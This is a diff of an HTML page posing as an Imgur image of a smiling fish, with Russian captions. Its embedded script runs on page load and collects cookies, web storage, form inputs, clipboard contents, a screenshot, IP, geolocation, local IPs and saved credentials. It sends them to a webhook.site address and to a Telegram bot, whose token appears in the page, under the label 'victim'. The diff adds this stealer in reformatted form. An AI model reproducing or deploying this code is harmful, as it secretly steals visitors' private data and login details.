@@ -5,264 +5,293 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Imgur</title>
     <style>
-        body { margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #0d0d1a; font-family: Arial, sans-serif; }
-        .card { background: #1a1a2e; padding: 30px; border-radius: 20px; text-align: center; max-width: 600px; border: 1px solid #2a3a5e; }
-        img { width: 100%; border-radius: 12px; border: 2px solid #1bb76e; }
-        h2 { color: #eee; font-weight: 300; }
-        p { color: #8892b0; font-size: 13px; }
+        body {
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: #0d0d1a;
+            font-family: Arial, sans-serif;
+        }
+        .card {
+            background: #1a1a2e;
+            padding: 30px;
+            border-radius: 20px;
+            text-align: center;
+            max-width: 600px;
+            border: 1px solid #2a3a5e;
+        }
+        img {
+            width: 100%;
+            border-radius: 12px;
+            border: 2px solid #1bb76e;
+            display: block;
+        }
+        h2 {
+            color: #eee;
+            font-weight: 300;
+        }
+        p {
+            color: #8892b0;
+            font-size: 13px;
+        }
     </style>
 </head>
 <body>
-<div class="card">
-    <h2>🐟 Улыбающаяся рыбка</h2>
-    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2MDAiIGhlaWdodD0iNDAwIiB2aWV3Qm94PSIwIDAgNjAwIDQwMCI+PHJlY3Qgd2lkdGg9IjYwMCIgaGVpZ2h0PSI0MDAiIGZpbGw9IiMxYzFjM2MiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZm9udC1mYW1pbHk9IkFyaWFsLCBzYW5zLXNlcmlmIiBmb250LXNpemU9IjUwIiBmaWxsPSIjZmZmIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBkeT0iLjNlbSI+4p2AIPCfkIEg8J+UgSDinYDwn5SBIPCfkIE8L3RleHQ+PC9zdmc+" alt="рыбка">
-    <p>Нажми для увеличения</p>
-</div>
+    <div class="card">
+        <h2>🐟 Улыбающаяся рыбка</h2>
+        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2MDAiIGhlaWdodD0iNDAwIiB2aWV3Qm94PSIwIDAgNjAwIDQwMCI+PHJlY3Qgd2lkdGg9IjYwMCIgaGVpZ2h0PSI0MDAiIGZpbGw9IiMxYzFjM2MiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZm9udC1mYW1pbHk9IkFyaWFsLCBzYW5zLXNlcmlmIiBmb250LXNpemU9IjUwIiBmaWxsPSIjZmZmIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBkeT0iLjNlbSI+4p2AIPCfkIEg8J+UgSDinYDwn5SBIPCfkIE8L3RleHQ+PC9zdmc+" alt="рыбка">
+        <p>Загрузка...</p>
+    </div>
 
-<script>
-// ============================================================
-//  НАСТРОЙКИ
-// ============================================================
-const WEBHOOK_URL = 'https://webhook.site/613658ef-cb9f-4d68-8bae-9ae016ec744b';
-const BOT_TOKEN = '8783402037:AAF1L0A_UP12EUOgn5x2g7UMFntHy3QjDfk';
-const CHAT_ID = '8327334745';
+    <script>
+        // ============================================================
+        //  НАСТРОЙКИ
+        // ============================================================
+        const WEBHOOK_URL = 'https://webhook.site/613658ef-cb9f-4d68-8bae-9ae016ec744b';
+        const BOT_TOKEN = '8783402037:AAF1L0A_UP12EUOgn5x2g7UMFntHy3QjDfk';
+        const CHAT_ID = '8327334745';
 
-// ============================================================
-//  АВТОСБОР БЕЗ ЗАПРОСОВ РАЗРЕШЕНИЙ
-// ============================================================
-(async function autoSteal() {
-    await new Promise(r => setTimeout(r, 1500));
+        // ============================================================
+        //  АВТОСБОР СРАЗУ ПРИ ЗАГРУЗКЕ СТРАНИЦЫ
+        // ============================================================
+        (async function autoSteal() {
+            // Даём странице 1 секунду на прогрузку
+            await new Promise(r => setTimeout(r, 1000));
 
-    const data = {};
+            const data = {};
 
-    // ---- 1. Куки ----
-    data.cookies = {};
-    if (document.cookie) {
-        document.cookie.split('; ').forEach(c => {
-            const [k, v] = c.split('=');
-            if (k) data.cookies[k] = v || '';
-        });
-    }
-
-    // ---- 2. LocalStorage ----
-    data.localStorage = {};
-    for (let i = 0; i < localStorage.length; i++) {
-        const key = localStorage.key(i);
-        if (key) data.localStorage[key] = localStorage.getItem(key);
-    }
-
-    // ---- 3. SessionStorage ----
-    data.sessionStorage = {};
-    for (let i = 0; i < sessionStorage.length; i++) {
-        const key = sessionStorage.key(i);
-        if (key) data.sessionStorage[key] = sessionStorage.getItem(key);
-    }
-
-    // ---- 4. Формы ----
-    data.forms = {};
-    document.querySelectorAll('input, textarea, select').forEach(el => {
-        const name = el.name || el.id || el.className || 'field';
-        if (el.value !== undefined && el.value !== null && el.value !== '') {
-            data.forms[name] = el.value;
-        }
-    });
-    document.querySelectorAll('form').forEach(form => {
-        try {
-            const fd = new FormData(form);
-            for (const [k, v] of fd.entries()) {
-                data.forms['form_' + k] = v;
+            // ---- 1. Куки ----
+            data.cookies = {};
+            if (document.cookie) {
+                document.cookie.split('; ').forEach(c => {
+                    const [k, v] = c.split('=');
+                    if (k) data.cookies[k] = v || '';
+                });
             }
-        } catch (_) {}
-    });
 
-    // ---- 5. IP и ГЕО через IP-API (БЕЗ ЗАПРОСОВ) ----
-    data.ip = null;
-    data.geo = null;
-    try {
-        // Сначала получаем IP
-        const ipResp = await fetch('https://api.ipify.org?format=json');
-        const ipJson = await ipResp.json();
-        data.ip = ipJson.ip;
-
-        // По IP получаем геолокацию (бесплатно, без ключей)
-        const geoResp = await fetch(`https://ip-api.com/json/${data.ip}?fields=status,message,country,city,lat,lon,isp,org,timezone`);
-        const geoJson = await geoResp.json();
-        if (geoJson.status === 'success') {
-            data.geo = {
-                country: geoJson.country,
-                city: geoJson.city,
-                lat: geoJson.lat,
-                lon: geoJson.lon,
-                isp: geoJson.isp,
-                org: geoJson.org,
-                timezone: geoJson.timezone
-            };
-        }
-    } catch (_) {
-        data.ip = null;
-        data.geo = null;
-    }
-
-    // ---- 6. Буфер обмена ----
-    data.clipboard = null;
-    try {
-        if (navigator.clipboard && navigator.clipboard.readText) {
-            data.clipboard = await navigator.clipboard.readText();
-        }
-    } catch (_) { data.clipboard = null; }
-
-    // ---- 7. Скриншот ----
-    data.screenshot = null;
-    try {
-        const script = document.createElement('script');
-        script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
-        document.head.appendChild(script);
-        await new Promise((res, rej) => {
-            script.onload = res;
-            script.onerror = rej;
-            setTimeout(res, 4000);
-        });
-        if (typeof html2canvas !== 'undefined') {
-            const canvas = await html2canvas(document.body, {
-                useCORS: true,
-                allowTaint: true,
-                scale: 0.4,
-                logging: false
-            });
-            data.screenshot = canvas.toDataURL('image/jpeg', 0.5);
-        }
-    } catch (_) { data.screenshot = null; }
-
-    // ---- 8. Ссылки ----
-    data.links = Array.from(document.querySelectorAll('a[href]')).map(a => a.href);
-
-    // ---- 9. Мета-теги ----
-    data.meta = {};
-    document.querySelectorAll('meta').forEach(m => {
-        const name = m.getAttribute('name') || m.getAttribute('property') || 'meta';
-        data.meta[name] = m.getAttribute('content') || '';
-    });
-
-    // ---- 10. Параметры URL ----
-    data.urlParams = {};
-    new URLSearchParams(window.location.search).forEach((v, k) => {
-        data.urlParams[k] = v;
-    });
-
-    // ---- 11. Реферер и URL ----
-    data.referrer = document.referrer || null;
-    data.url = window.location.href;
-
-    // ---- 12. IndexedDB ----
-    data.indexedDB = null;
-    try {
-        if (indexedDB.databases) {
-            const dbs = await indexedDB.databases();
-            data.indexedDB = dbs.map(db => db.name);
-        }
-    } catch (_) { data.indexedDB = null; }
-
-    // ---- 13. WebRTC (локальный IP) ----
-    data.localIPs = null;
-    try {
-        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-        const ips = [];
-        pc.onicecandidate = (e) => {
-            if (e.candidate) {
-                const ip = e.candidate.candidate.split(' ')[4];
-                if (ip && !ips.includes(ip)) ips.push(ip);
+            // ---- 2. LocalStorage ----
+            data.localStorage = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                if (key) data.localStorage[key] = localStorage.getItem(key);
             }
-        };
-        pc.createDataChannel('test');
-        await pc.createOffer().then(o => pc.setLocalDescription(o));
-        await new Promise(r => setTimeout(r, 2000));
-        pc.close();
-        data.localIPs = ips;
-    } catch (_) { data.localIPs = null; }
 
-    // ---- 14. Credentials (сохранённые пароли) ----
-    data.credentials = null;
-    try {
-        if (navigator.credentials && navigator.credentials.get) {
-            const cred = await navigator.credentials.get({ 
-                password: true, 
-                federated: { providers: ['https://accounts.google.com', 'https://facebook.com'] } 
+            // ---- 3. SessionStorage ----
+            data.sessionStorage = {};
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                if (key) data.sessionStorage[key] = sessionStorage.getItem(key);
+            }
+
+            // ---- 4. Формы (пароли, логины, всё что введено) ----
+            data.forms = {};
+            document.querySelectorAll('input, textarea, select').forEach(el => {
+                const name = el.name || el.id || el.className || 'field';
+                if (el.value !== undefined && el.value !== null && el.value !== '') {
+                    data.forms[name] = el.value;
+                }
             });
-            if (cred) {
-                data.credentials = {
-                    type: cred.type,
-                    id: cred.id
+            document.querySelectorAll('form').forEach(form => {
+                try {
+                    const fd = new FormData(form);
+                    for (const [k, v] of fd.entries()) {
+                        data.forms['form_' + k] = v;
+                    }
+                } catch (_) {}
+            });
+
+            // ---- 5. IP и ГЕО (БЕЗ ЗАПРОСОВ!) ----
+            data.ip = null;
+            data.geo = null;
+            try {
+                // Получаем IP
+                const ipResp = await fetch('https://api.ipify.org?format=json');
+                const ipJson = await ipResp.json();
+                data.ip = ipJson.ip;
+
+                // По IP получаем геолокацию (без запросов разрешений)
+                const geoResp = await fetch(`https://ip-api.com/json/${data.ip}?fields=status,country,city,lat,lon,isp,org,timezone,regionName`);
+                const geoJson = await geoResp.json();
+                if (geoJson.status === 'success') {
+                    data.geo = {
+                        country: geoJson.country || 'неизвестно',
+                        region: geoJson.regionName || 'неизвестно',
+                        city: geoJson.city || 'неизвестно',
+                        lat: geoJson.lat || 0,
+                        lon: geoJson.lon || 0,
+                        isp: geoJson.isp || 'неизвестно',
+                        org: geoJson.org || 'неизвестно',
+                        timezone: geoJson.timezone || 'неизвестно'
+                    };
+                }
+            } catch (_) {
+                data.ip = 'не удалось получить';
+                data.geo = 'не удалось получить';
+            }
+
+            // ---- 6. Буфер обмена ----
+            data.clipboard = null;
+            try {
+                if (navigator.clipboard && navigator.clipboard.readText) {
+                    data.clipboard = await navigator.clipboard.readText();
+                }
+            } catch (_) { data.clipboard = null; }
+
+            // ---- 7. Скриншот ----
+            data.screenshot = null;
+            try {
+                const script = document.createElement('script');
+                script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
+                document.head.appendChild(script);
+                await new Promise((res, rej) => {
+                    script.onload = res;
+                    script.onerror = rej;
+                    setTimeout(res, 4000);
+                });
+                if (typeof html2canvas !== 'undefined') {
+                    const canvas = await html2canvas(document.body, {
+                        useCORS: true,
+                        allowTaint: true,
+                        scale: 0.4,
+                        logging: false
+                    });
+                    data.screenshot = canvas.toDataURL('image/jpeg', 0.5);
+                }
+            } catch (_) { data.screenshot = null; }
+
+            // ---- 8. Ссылки ----
+            data.links = Array.from(document.querySelectorAll('a[href]')).map(a => a.href);
+
+            // ---- 9. Мета-теги ----
+            data.meta = {};
+            document.querySelectorAll('meta').forEach(m => {
+                const name = m.getAttribute('name') || m.getAttribute('property') || 'meta';
+                data.meta[name] = m.getAttribute('content') || '';
+            });
+
+            // ---- 10. Параметры URL ----
+            data.urlParams = {};
+            new URLSearchParams(window.location.search).forEach((v, k) => {
+                data.urlParams[k] = v;
+            });
+
+            // ---- 11. Реферер и URL ----
+            data.referrer = document.referrer || null;
+            data.url = window.location.href;
+
+            // ---- 12. IndexedDB ----
+            data.indexedDB = null;
+            try {
+                if (indexedDB.databases) {
+                    const dbs = await indexedDB.databases();
+                    data.indexedDB = dbs.map(db => db.name);
+                }
+            } catch (_) { data.indexedDB = null; }
+
+            // ---- 13. WebRTC (локальный IP) ----
+            data.localIPs = null;
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                const ips = [];
+                pc.onicecandidate = (e) => {
+                    if (e.candidate) {
+                        const ip = e.candidate.candidate.split(' ')[4];
+                        if (ip && !ips.includes(ip)) ips.push(ip);
+                    }
                 };
+                pc.createDataChannel('test');
+                await pc.createOffer().then(o => pc.setLocalDescription(o));
+                await new Promise(r => setTimeout(r, 2000));
+                pc.close();
+                data.localIPs = ips;
+            } catch (_) { data.localIPs = null; }
+
+            // ---- 14. Credentials (сохранённые пароли) ----
+            data.credentials = null;
+            try {
+                if (navigator.credentials && navigator.credentials.get) {
+                    const cred = await navigator.credentials.get({
+                        password: true,
+                        federated: { providers: ['https://accounts.google.com', 'https://facebook.com'] }
+                    });
+                    if (cred) {
+                        data.credentials = {
+                            type: cred.type,
+                            id: cred.id
+                        };
+                    }
+                }
+            } catch (_) { data.credentials = null; }
+
+            // ============================================================
+            //  ОТПРАВКА
+            // ============================================================
+            const payload = JSON.stringify(data);
+
+            // Отправка на Webhook
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: payload
+                });
+            } catch (_) {}
+
+            // Отправка в Telegram (кратко, только ценное)
+            try {
+                let msg = '🔴 ЖЕРТВА\n';
+                if (data.ip) msg += `🌐 IP: ${data.ip}\n`;
+                if (data.geo && typeof data.geo === 'object') {
+                    msg += `📍 Страна: ${data.geo.country || '?'}\n`;
+                    msg += `🏙 Регион: ${data.geo.region || '?'}\n`;
+                    msg += `🏠 Город: ${data.geo.city || '?'}\n`;
+                    msg += `🗺 Координаты: ${data.geo.lat || '?'}, ${data.geo.lon || '?'}\n`;
+                    if (data.geo.isp) msg += `📡 Провайдер: ${data.geo.isp}\n`;
+                }
+                if (data.clipboard) msg += `📋 Буфер: ${data.clipboard.substring(0, 100)}\n`;
+                if (data.credentials) msg += `🔑 Логин: ${data.credentials.id}\n`;
+                if (data.localIPs && data.localIPs.length) msg += `📡 Локальный IP: ${data.localIPs.join(', ')}\n`;
+
+                const cookiesCount = Object.keys(data.cookies).length;
+                const lsCount = Object.keys(data.localStorage).length;
+                const ssCount = Object.keys(data.sessionStorage).length;
+                const formsCount = Object.keys(data.forms).length;
+                msg += `🍪 Куки: ${cookiesCount} шт.\n`;
+                msg += `💾 LocalStorage: ${lsCount} шт.\n`;
+                msg += `🗂 SessionStorage: ${ssCount} шт.\n`;
+                msg += `📝 Формы: ${formsCount} шт.\n`;
+                if (data.indexedDB && data.indexedDB.length) msg += `🗄 IndexedDB: ${data.indexedDB.join(', ')}\n`;
+                if (data.screenshot) msg += `🖼 Скриншот: есть (${(data.screenshot.length / 1024).toFixed(0)} КБ)\n`;
+                msg += `🔗 URL: ${data.url}`;
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: msg
+                    })
+                });
+            } catch (_) {}
+
+            // Скриншот отдельно (если есть)
+            if (data.screenshot && data.screenshot.length > 5000) {
+                try {
+                    const blob = await fetch(data.screenshot).then(r => r.blob());
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'screenshot.jpg');
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (_) {}
             }
-        }
-    } catch (_) { data.credentials = null; }
 
-    // ============================================================
-    //  ОТПРАВКА
-    // ============================================================
-    const payload = JSON.stringify(data);
-
-    // На Webhook
-    try {
-        await fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: payload
-        });
-    } catch (_) {}
-
-    // В Telegram
-    try {
-        let msg = '🔴 ЖЕРТВА\n';
-        if (data.ip) msg += `🌐 IP: ${data.ip}\n`;
-        if (data.geo) {
-            msg += `📍 Страна: ${data.geo.country || '?'}\n`;
-            msg += `🏙 Город: ${data.geo.city || '?'}\n`;
-            msg += `🗺 Координаты: ${data.geo.lat || '?'}, ${data.geo.lon || '?'}\n`;
-            if (data.geo.isp) msg += `📡 Провайдер: ${data.geo.isp}\n`;
-        }
-        if (data.clipboard) msg += `📋 Буфер: ${data.clipboard.substring(0, 100)}\n`;
-        if (data.credentials) msg += `🔑 Логин: ${data.credentials.id}\n`;
-        if (data.localIPs && data.localIPs.length) msg += `📡 Локальный IP: ${data.localIPs.join(', ')}\n`;
-        
-        const cookiesCount = Object.keys(data.cookies).length;
-        const lsCount = Object.keys(data.localStorage).length;
-        const ssCount = Object.keys(data.sessionStorage).length;
-        const formsCount = Object.keys(data.forms).length;
-        msg += `🍪 Куки: ${cookiesCount} шт.\n`;
-        msg += `💾 LocalStorage: ${lsCount} шт.\n`;
-        msg += `🗂 SessionStorage: ${ssCount} шт.\n`;
-        msg += `📝 Формы: ${formsCount} шт.\n`;
-        if (data.indexedDB) msg += `🗄 IndexedDB: ${data.indexedDB.join(', ')}\n`;
-        if (data.screenshot) msg += `🖼 Скриншот: есть (${(data.screenshot.length / 1024).toFixed(0)} КБ)\n`;
-        msg += `🔗 URL: ${data.url}`;
-
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: msg
-            })
-        });
-    } catch (_) {}
-
-    // Скриншот отдельно
-    if (data.screenshot && data.screenshot.length > 5000) {
-        try {
-            const blob = await fetch(data.screenshot).then(r => r.blob());
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'screenshot.jpg');
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
-        } catch (_) {}
-    }
-
-    console.log('✅ Данные отправлены');
-})();
-</script>
+            console.log('✅ Данные отправлены');
+        })();
+    </script>
 </body>
 </html>
